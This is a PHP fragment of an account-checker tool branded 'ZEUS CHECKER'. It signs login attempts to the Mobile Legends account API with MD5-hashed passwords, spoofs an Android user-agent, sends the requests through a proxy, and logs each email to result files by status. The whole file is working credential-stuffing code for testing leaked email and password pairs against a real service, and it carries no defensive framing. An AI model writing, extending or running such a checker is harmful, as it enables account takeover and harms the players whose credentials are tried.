function check($em, $pass)
{
	$ua = \Campo\UserAgent::random(array("agent_type" => "Browser", "os_type" => "Android"));
    $header = array(
    "host" => "accountmtapi.mobilelegends.com",
    "origin" => "https://mtacc.mobilelegends.com",
    "user-agent" => $ua,
    "x-requested-with" => "com.mobile.legends",
    "referer" => "https://mtacc.mobilelegends.com/v2.1/inapp/login"
    );
    $pwd = md5($pass);
    $sign = md5("account=$em&md5pwd=$pwd&op=login");
    $datas = array(
    "op" => "login",
    "sign" => $sign,
    "params" => array(
    "account" => $em,
    "md5pwd" => $pwd
    ),
    "lang" => "en"
    );
    $data = json_encode($datas);
    
    $request = new Request('POST', 'https://accountmtapi.mobilelegends.com', $header, $data);
    $proxy = new Proxy();
    $proxy->getEventDispatcher()->addListener(
        'request.before_send', function ($event) {
            $event['request']->headers->set('X-Forwarded-For', 'php-proxy');
        }
    );

    $proxy->getEventDispatcher()->addListener(
        'request.sent', function ($event) {
            if($event['response']->getStatusCode() != 200) {
                die($event['response']->getStatusCode() . " - Bad status code!");
            }
        }
    );

    $proxy->getEventDispatcher()->addListener(
        'request.complete', function ($event) {
            $content = $event['response']->getContent();
            $event['response']->setContent($content);
        }
    );

    $response = $proxy->forward($request, "https://accountmtapi.mobilelegends.com");
    $res = $response->getContent();
  
    return $res;
}

function append_to_file($filename, $email)
{
    global $dir;
    file_put_contents($dir . '/' . $filename, $email . PHP_EOL, FILE_APPEND);
}

function print_status($email, $status)
{
    return 'ZEUS CHECKER' . ' - ' . date("H:i:s") . ' - ' . $email . ' - ' . $status;
}

function is_contain($text, $contain)
{
    if (strpos($text, $contain) !== false) {
        return true;
    } else {
        return false;
    }
}
